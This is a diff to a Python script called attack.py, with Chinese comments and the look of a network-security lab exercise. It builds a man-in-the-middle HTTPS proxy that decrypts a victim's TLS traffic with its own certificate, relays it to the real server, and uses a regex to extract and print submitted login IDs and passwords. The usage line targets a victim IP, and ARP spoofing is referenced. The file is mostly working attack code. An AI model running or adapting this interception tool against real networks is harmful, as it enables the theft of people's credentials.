@@ -1,57 +1,38 @@
+#!/usr/bin/env python3
 import socket
 import ssl
 import threading
 import sys
 import time
 from scapy.all import *
+import urllib.parse
+import subprocess
 
 # 設定證書路徑
 CERT_FILE = "certificates/host.crt"
 KEY_FILE = "certificates/host.key"
 
+def get_interface_name():
+    result = subprocess.check_output("ls /sys/class/net", shell=True, text=True)
+    interfaces = result.strip().split('\n')
+
+    # print("Interfaces:", interfaces)
+
+    for name in interfaces:
+        if (name != 'lo'):
+            return name
+    return 'lo'
+
+def extract_info(request):
+    match = re.search(b"\nid=([^&]+)&pwd=([^&]+)", request)
+    if match:
+        user_id = match.group(1).decode()
+        password = match.group(2).decode()
+        # print(f"[!!!] 攔截的帳號密碼: id={user_id}, pwd={password}")
+        print(f"id: {urllib.parse.unquote(user_id)}, password: {urllib.parse.unquote(password)}")
+
 # MITM 代理伺服器
 def mitm_proxy(client_socket, victim_ip):
-    try:
-        # 接收受害者的 HTTPS 請求
-        request = client_socket.recv(4096)
-        print(f"[*] 來自 {victim_ip} 的請求: {request[:50]}...")
-
-        # 解析請求目標 (找到 Host)
-        lines = request.split(b"\r\n")
-        host = None
-        for line in lines:
-            if line.startswith(b"Host:"):
-                host = line.split(b" ")[1].decode()
-                break
-
-        if not host:
-            print("[!] 找不到 Host，無法轉發請求")
-            return
-
-        print(f"[*] 轉發請求到 {host}")
-
-        # 連線到真正的 HTTPS 伺服器
-        server_socket = socket.create_connection((host, 443))
-        context = ssl.create_default_context()
-        server_socket = context.wrap_socket(server_socket, server_hostname=host)
-        server_socket.sendall(request)
-
-        # 接收伺服器回應
-        response = server_socket.recv(4096)
-        print(f"[*] 伺服器回應: {response[:50]}...")
-
-        # 回傳給受害者
-        client_socket.sendall(response)
-
-        server_socket.close()
-
-    except Exception as e:
-        print(f"[!] MITM 轉發錯誤: {e}")
-
-    finally:
-        client_socket.close()
-
-def mitm_proxy2(client_socket, victim_ip):
     try:
         client_socket.settimeout(2.0)  # 設定受害者 socket timeout
         request = b""
@@ -69,13 +50,8 @@ def mitm_proxy2(client_socket, victim_ip):
 
         # print(f"[*] 來自 {victim_ip} 的請求: {request[:50]}...")
 
-        # # 使用正則表達式匹配 id 和 pwd
-        match = re.search(b"\nid=([^&]+)&pwd=([^&]+)", request)
-        if match:
-            user_id = match.group(1).decode()
-            password = match.group(2).decode()
-            # print(f"[!!!] 攔截的帳號密碼: id={user_id}, pwd={password}")
-            print(f"id: {user_id}, password: {password}")
+        # extract user package for getting id and pwd
+        extract_info(request)
 
         # 解析請求目標 (找到 Host)
         lines = request.split(b"\r\n")
@@ -101,7 +77,7 @@ def mitm_proxy2(client_socket, victim_ip):
             ip_address = socket.gethostbyname(host)  # 解析域名為 IP
             print(f"TLS Connection Established : [{ip_address}:443]")
         except socket.gaierror:
-            print(f"[!] 無法解析 {host}，使用原始域名")
+            # print(f"[!] 無法解析 {host}，使用原始域名")
             print(f"TLS Connection Established : [{host}:443]")
 
 
@@ -142,29 +118,25 @@ def start_https_listener(interface):
 
     while True:
         client_socket, client_addr = server_socket.accept()
-        # print(f"[*] 來自 {client_addr} 的連線")
-        # print(f"TLS Connection Established : [{client_addr[0]}:{client_addr[1]}]")
+        # print(f"TLS Connection from : [{client_addr[0]}:{client_addr[1]}]")
         
         # 用 SSL 解密受害者的請求
         client_socket = context.wrap_socket(client_socket, server_side=True)
         
         # 啟動新執行緒處理請求
-        # thread = threading.Thread(target=mitm_proxy, args=(client_socket, client_addr[0]))
-        thread = threading.Thread(target=mitm_proxy2, args=(client_socket, client_addr[0]))
+        thread = threading.Thread(target=mitm_proxy, args=(client_socket, client_addr[0]))
         thread.start()
 
 def main():
-    if len(sys.argv) != 4:
-        print("Usage: sudo python3 ./attack.py <victim_ip> <gateway_ip> <interface>")
+    if len(sys.argv) < 2:
+        print("Usage: sudo python3 ./attack.py <victim_ip> <interface>\n       OR\n       sudo python3 ./attack.py <victim_ip>")
         sys.exit(1)
-
-    victim_ip = sys.argv[1]
-    gateway_ip = sys.argv[2]
-    interface = sys.argv[3]
-
-    # 啟動 ARP Spoofing
-    # arp_thread = threading.Thread(target=arp_spoof, args=(victim_ip, gateway_ip, interface))
-    # arp_thread.start()
+    elif len(sys.argv) == 3:
+        victim_ip = sys.argv[1]
+        interface = sys.argv[2]
+    elif len(sys.argv) == 2:
+        victim_ip = sys.argv[1]
+        interface = get_interface_name()
 
     # 監聽 HTTPS 流量
     start_https_listener(interface)
